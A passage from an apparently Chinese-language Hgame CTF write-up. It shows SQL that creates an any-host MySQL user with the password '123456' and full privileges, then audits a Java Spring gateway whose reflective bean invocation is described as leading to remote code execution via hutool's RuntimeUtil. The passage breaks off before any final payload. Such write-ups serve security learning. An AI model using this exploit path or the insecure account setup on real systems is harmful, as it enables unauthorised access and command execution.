+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CREATE USER <span style="color:#e6db74">&#39;remote_user&#39;</span>@<span style="color:#e6db74">&#39;%&#39;</span> IDENTIFIED BY <span style="color:#e6db74">&#39;123456&#39;</span>;
+</span></span><span style="display:flex;"><span>GRANT ALL PRIVILEGES ON *.* TO <span style="color:#e6db74">&#39;remote_user&#39;</span>@<span style="color:#e6db74">&#39;%&#39;</span> WITH GRANT OPTION;
+</span></span><span style="display:flex;"><span>FLUSH PRIVILEGES;
+</span></span></code></pre></div><p>这里是检测</p>
+<p>用<code>SELECT user, host FROM mysql.user WHERE user = 'remote_user';</code>检查</p>
+<p><img alt="2025-02-22163358" loading="lazy" src="../../images/Hgame/2025-02-22163358.png"></p>
+<h3 id="level-60-signinjava">Level 60 SignInJava<a hidden class="anchor" aria-hidden="true" href="#level-60-signinjava">#</a></h3>
+<p>动态注册恶意Bean实现RCE</p>
+<p>审计一下代码(由于不会java所以和其他师傅要wp分析的，厌蠢症患者勿骂)</p>
+<p>（Controller），用于处理POST请求，接受客户端传来的JSON数据，解析并根据指定的bean和方法名反射调用相应的服务方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/gateway&#34;</span>}, method <span style="color:#f92672">=</span> {RequestMethod.<span style="color:#a6e22e">POST</span>})
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ResponseBody</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> BaseResponse <span style="color:#a6e22e">doPost</span>(HttpServletRequest request) <span style="color:#66d9ef">throws</span> Exception {
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String body <span style="color:#f92672">=</span> IOUtils.<span style="color:#a6e22e">toString</span>(request.<span style="color:#a6e22e">getReader</span>());
+</span></span><span style="display:flex;"><span>Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> (Map) JSON.<span style="color:#a6e22e">parseObject</span>(body, Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>String beanName <span style="color:#f92672">=</span> (String) map.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;beanName&#34;</span>);
+</span></span><span style="display:flex;"><span>String methodName <span style="color:#f92672">=</span> (String) map.<span style="color:#a6e22e">get</span>(JsonEncoder.<span style="color:#a6e22e">METHOD_NAME_ATTR_NAME</span>);
+</span></span><span style="display:flex;"><span>Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> params <span style="color:#f92672">=</span> (Map) map.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;params&#34;</span>);
+</span></span></code></pre></div><p>使用<code>IOUtils.toString(request.getReader())</code>读取HTTP请求体。</p>
+<p>将请求体解析为JSON对象，并转化为<code>Map&lt;String, Object&gt;</code>类型。</p>
+<p>从解析后的<code>map</code>中获取<code>beanName</code>、<code>methodName</code>和<code>params</code>，这些是后续反射调用所需的信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (StrUtil.<span style="color:#a6e22e">containsAnyIgnoreCase</span>(beanName, <span style="color:#e6db74">&#34;flag&#34;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> BaseResponse(403, <span style="color:#e6db74">&#34;flagTestService offline&#34;</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果<code>beanName</code>包含&quot;flag&quot;字样（不区分大小写），返回403错误，提示&quot;flagTestService offline&quot;。这可能是为了防止某些特殊请求（如安全相关的标志获取等）。后面的代码是反射调用和异常处理</p>
+<hr>
+<p>实现了一个名为 <code>InvokeUtils</code> 的工具类，主要用于动态反射调用Spring容器中的bean方法。该工具类通过反射获取指定bean的方法，并根据请求的参数动态地构建方法参数进行调用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Lazy</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> Filter autoTypeFilter <span style="color:#f92672">=</span> JSONReader.<span style="color:#a6e22e">autoTypeFilter</span>((String<span style="color:#f92672">[]</span>) ((Set) Arrays.<span style="color:#a6e22e">stream</span>(SpringContextHolder.<span style="color:#a6e22e">getApplicationContext</span>().<span style="color:#a6e22e">getBeanDefinitionNames</span>())
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">map</span>(name <span style="color:#f92672">-&gt;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> secondDotIndex <span style="color:#f92672">=</span> name.<span style="color:#a6e22e">indexOf</span>(46, name.<span style="color:#a6e22e">indexOf</span>(46) <span style="color:#f92672">+</span> 1);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (secondDotIndex <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> name.<span style="color:#a6e22e">substring</span>(0, secondDotIndex <span style="color:#f92672">+</span> 1);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">filter</span>((v0) <span style="color:#f92672">-&gt;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Objects.<span style="color:#a6e22e">nonNull</span>(v0);
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">collect</span>(Collectors.<span style="color:#a6e22e">toSet</span>())).<span style="color:#a6e22e">toArray</span>(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>));
+</span></span></code></pre></div><p><strong><code>@Lazy</code></strong>：<code>autoTypeFilter</code>会在第一次使用时进行初始化，避免提前加载，优化启动时间。</p>
+<p><strong><code>autoTypeFilter</code></strong>：通过扫描Spring应用上下文中的所有bean名称，提取每个bean名的前缀（即包路径的一部分），并用于在<code>JSON.parseObject</code>方法中作为过滤器。为了防止反序列化时不安全的类型被引入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">invokeBeanMethod</span>(String beanName, String methodName, Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> params) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    Object beanObject <span style="color:#f92672">=</span> SpringContextHolder.<span style="color:#a6e22e">getBean</span>(beanName);
+</span></span><span style="display:flex;"><span>    Method beanMethod <span style="color:#f92672">=</span> (Method) Arrays.<span style="color:#a6e22e">stream</span>(beanObject.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getMethods</span>()).<span style="color:#a6e22e">filter</span>(method <span style="color:#f92672">-&gt;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> method.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(methodName);
+</span></span><span style="display:flex;"><span>    }).<span style="color:#a6e22e">findFirst</span>().<span style="color:#a6e22e">orElse</span>(<span style="color:#66d9ef">null</span>);
+</span></span></code></pre></div><p><strong>获取Bean</strong>：通过<code>SpringContextHolder.getBean(beanName)</code>获取Spring容器中的bean实例。</p>
+<p><strong>获取方法</strong>：通过<code>Arrays.stream(beanObject.getClass().getMethods())</code>获取所有方法并通过<code>method.getName().equals(methodName)</code>来找到匹配的方法。若找不到，返回<code>null</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (beanMethod.<span style="color:#a6e22e">getParameterCount</span>() <span style="color:#f92672">==</span> 0) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> beanMethod.<span style="color:#a6e22e">invoke</span>(beanObject, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>String<span style="color:#f92672">[]</span> parameterTypes <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>beanMethod.<span style="color:#a6e22e">getParameterCount</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>Object<span style="color:#f92672">[]</span> parameterArgs <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>beanMethod.<span style="color:#a6e22e">getParameterCount</span>()<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> beanMethod.<span style="color:#a6e22e">getParameters</span>().<span style="color:#a6e22e">length</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    Class<span style="color:#f92672">&lt;?&gt;</span> parameterType <span style="color:#f92672">=</span> beanMethod.<span style="color:#a6e22e">getParameterTypes</span>()<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>    String parameterName <span style="color:#f92672">=</span> beanMethod.<span style="color:#a6e22e">getParameters</span>()<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>    parameterTypes<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> parameterType.<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>parameterType.<span style="color:#a6e22e">isPrimitive</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Date.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Long.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Integer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Boolean.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Double.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Float.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Short.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Byte.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Character.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>String.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>List.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Set.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Map.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType)) {
+</span></span></code></pre></div><p>对于有参数的方法，首先解析出方法的参数类型和参数名称，并且构建一个参数数组<code>parameterArgs</code>来存放实际参数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>parameterType.<span style="color:#a6e22e">isPrimitive</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Date.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Long.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Integer.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Boolean.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Double.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Float.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Short.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Byte.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Character.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>String.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>List.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Set.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>Map.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">equals</span>(parameterType)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (params.<span style="color:#a6e22e">containsKey</span>(parameterName)) {
+</span></span><span style="display:flex;"><span>        parameterArgs<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(JSON.<span style="color:#a6e22e">toJSONString</span>(params.<span style="color:#a6e22e">get</span>(parameterName)), (Class) parameterType, autoTypeFilter, <span style="color:#66d9ef">new</span> JSONReader.<span style="color:#a6e22e">Feature</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            parameterArgs<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(JSON.<span style="color:#a6e22e">toJSONString</span>(params), (Class) parameterType, autoTypeFilter, <span style="color:#66d9ef">new</span> JSONReader.<span style="color:#a6e22e">Feature</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (JSONException e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> entry : params.<span style="color:#a6e22e">entrySet</span>()) {
+</span></span><span style="display:flex;"><span>                Object value <span style="color:#f92672">=</span> entry.<span style="color:#a6e22e">getValue</span>();
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ((value <span style="color:#66d9ef">instanceof</span> String) <span style="color:#f92672">&amp;&amp;</span> ((String) value).<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;\&#34;&#34;</span>)) {
+</span></span><span style="display:flex;"><span>                    params.<span style="color:#a6e22e">put</span>(entry.<span style="color:#a6e22e">getKey</span>(), JSON.<span style="color:#a6e22e">parse</span>((String) value));
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            parameterArgs<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> JSON.<span style="color:#a6e22e">parseObject</span>(JSON.<span style="color:#a6e22e">toJSONString</span>(params), (Class) parameterType, autoTypeFilter, <span style="color:#66d9ef">new</span> JSONReader.<span style="color:#a6e22e">Feature</span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    parameterArgs<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> params.<span style="color:#a6e22e">getOrDefault</span>(parameterName, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果方法参数类型不是基础类型（如<code>String</code>, <code>Integer</code>, <code>List</code>等），则尝试使用Fastjson的<code>parseObject</code>将<code>params</code>中的相应字段反序列化为目标参数类型。</p>
+<ul>
+<li>使用<code>autoTypeFilter</code>：在反序列化过程中，使用<code>autoTypeFilter</code>来避免类型安全问题。</li>
+<li>如果<code>params</code>中不存在该参数名，则尝试将整个<code>params</code>映射到目标类型。</li>
+<li>如果解析失败（<code>JSONException</code>），则通过递归尝试解析参数内嵌的JSON字符串。</li>
+</ul>
+<p>对于基础类型（包括<code>String</code>、<code>Integer</code>、<code>Boolean</code>等），直接从<code>params</code>中获取对应的值。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> beanMethod.<span style="color:#a6e22e">invoke</span>(beanObject, parameterArgs);
+</span></span></code></pre></div><p>这个是触发点，利用下面这个类</p>
+<p><img alt="2025-02-22180854" loading="lazy" src="../../images/Hgame/2025-02-22180854.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> cn.hutool.core.util;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.core.exceptions.UtilException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.core.io.IORuntimeException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.core.io.IoUtil;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.core.lang.Pid;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cn.hutool.core.text.StrBuilder;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.Closeable;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.charset.Charset;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.ArrayList;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.List;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Stack;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: SigninJava.jar:BOOT-INF/lib/hutool-all-5.8.33.jar:cn/hutool/core/util/RuntimeUtil.class */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RuntimeUtil</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">execForStr</span>(String... cmds) <span style="color:#66d9ef">throws</span> IORuntimeException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> execForStr(CharsetUtil.<span style="color:#a6e22e">systemCharset</span>(), cmds);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">execForStr</span>(Charset charset, String... cmds) <span style="color:#66d9ef">throws</span> IORuntimeException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getResult(exec(cmds), charset);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">execForLines</span>(String... cmds) <span style="color:#66d9ef">throws</span> IORuntimeException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> execForLines(CharsetUtil.<span style="color:#a6e22e">systemCharset</span>(), cmds);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">execForLines</span>(Charset charset, String... cmds) <span style="color:#66d9ef">throws</span> IORuntimeException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getResultLines(exec(cmds), charset);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Process <span style="color:#a6e22e">exec</span>(String... cmds) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            Process process <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(handleCmds(cmds)).<span style="color:#a6e22e">redirectErrorStream</span>(<span style="color:#66d9ef">true</span>).<span style="color:#a6e22e">start</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> process;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IORuntimeException(e);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Process <span style="color:#a6e22e">exec</span>(String<span style="color:#f92672">[]</span> envp, String... cmds) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> exec(envp, <span style="color:#66d9ef">null</span>, cmds);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Process <span style="color:#a6e22e">exec</span>(String<span style="color:#f92672">[]</span> envp, File dir, String... cmds) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(handleCmds(cmds), envp, dir);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IORuntimeException(e);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">getResultLines</span>(Process process) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getResultLines(process, CharsetUtil.<span style="color:#a6e22e">systemCharset</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">getResultLines</span>(Process process, Charset charset) {
+</span></span><span style="display:flex;"><span>        InputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            in <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">&gt;</span> list <span style="color:#f92672">=</span> (List) IoUtil.<span style="color:#a6e22e">readLines</span>(in, charset, <span style="color:#66d9ef">new</span> ArrayList());
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> list;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Throwable th) {
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> th;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getResult</span>(Process process) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getResult(process, CharsetUtil.<span style="color:#a6e22e">systemCharset</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getResult</span>(Process process, Charset charset) {
+</span></span><span style="display:flex;"><span>        InputStream in <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            in <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            String read <span style="color:#f92672">=</span> IoUtil.<span style="color:#a6e22e">read</span>(in, charset);
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> read;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Throwable th) {
+</span></span><span style="display:flex;"><span>            IoUtil.<span style="color:#a6e22e">close</span>((Closeable) in);
+</span></span><span style="display:flex;"><span>            destroy(process);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> th;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getErrorResult</span>(Process process) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> getErrorResult(process, CharsetUtil.<span style="color:#a6e22e">systemCharset</span>());
+</span></span><span style="display:flex;"><span>    }
